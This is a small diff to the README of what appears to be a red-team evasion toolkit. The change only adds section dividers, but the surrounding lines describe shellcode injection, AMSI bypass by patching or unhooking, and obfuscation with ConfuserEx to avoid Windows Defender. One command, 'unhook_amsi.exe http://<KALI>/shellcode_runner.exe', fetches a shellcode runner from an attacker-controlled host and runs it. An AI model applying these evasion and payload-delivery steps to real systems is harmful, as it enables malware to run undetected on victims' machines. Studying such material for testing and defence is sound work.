@@ -196,7 +196,7 @@ It will inject the shellcode to a memory space inside des_decryptor_embedded_mar
 cmd> des_decryptor_embedded_marshal.exe
 ```
 
-
+----
 ### 1.2 AMSI Bypass
 There are two methods to bypass AMSI:
 - Patching 
@@ -234,7 +234,7 @@ To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github
 2. Copy your shellcode runner (```payloads/XOR/``` or ```payloads/Caesar/```) to your web server folder.
 3. ```unhook_amsi.exe http://<KALI>/shellcode_runner.exe```
 
-
+---
 ### 1.3 Executing .XSL, .JS, .HTA
 
 Under directory ```payloads/DotNetToJScript/```, you find three shellcode ruuners that generated with **DotNetToJScript** (https://github.com/tyranid/DotNetToJScript). 
@@ -258,7 +258,7 @@ wscript c:\users\public\shellcode_runner.js
 More execution methods can be found:
 - https://lolbas-project.github.io/
 
-
+---
 ### 1.4 ConfuserEx + Net-Obfuscator
 
 During my tests, I noticed that Windows Defender could detect payloads genereted by **ConfuserEx** (https://github.com/yck1509/ConfuserEx). For this reason, I combined ```ConfuserEx + Net-Obfuscator``` (https://github.com/BinaryScary/NET-Obfuscate). 
